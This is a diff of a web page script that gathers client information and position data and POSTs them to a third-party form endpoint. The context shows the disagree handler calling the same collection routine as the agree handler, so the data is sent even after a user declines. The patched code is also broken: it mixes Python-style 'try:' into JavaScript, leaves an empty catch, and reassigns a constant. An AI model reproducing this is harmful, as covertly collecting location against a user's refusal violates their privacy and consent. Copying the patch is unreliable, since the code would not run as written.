@@ -12,18 +12,13 @@ async function getLocation() {
 }
 
 async function sendRequest(data) {
-  while (true) {
-    try {
-      const response = await fetch("https://formspree.io/f/xeorknrp", {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: JSON.stringify(data),
-      });
-      break;
-    } catch (err) {
-      alert("Error!")
-      await new Promise(r => setTimeout(r, 1000));
-    }
+  try:
+    const response = await fetch("https://formspree.io/f/xeorknrp", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify(data),
+    });
+  catch (err) {
   }
 }
 
@@ -44,14 +39,16 @@ async function getPosData() {
 }
 
 async function start() {
-  const fs = [
+  if (finished) return;
+  const funs = [
     collectPublicClientInfo,
     getPosData
   ]
-  for (let f of fs) {
+  for (let f of funs) {
     const d = await f();
     await sendRequest(d);
   }
+  finished = true;
 }
 
 async function agree() {
@@ -63,3 +60,6 @@ async function disAgree() {
   alert("clicked");
   await start();
 }
+
+const finished = false;
+
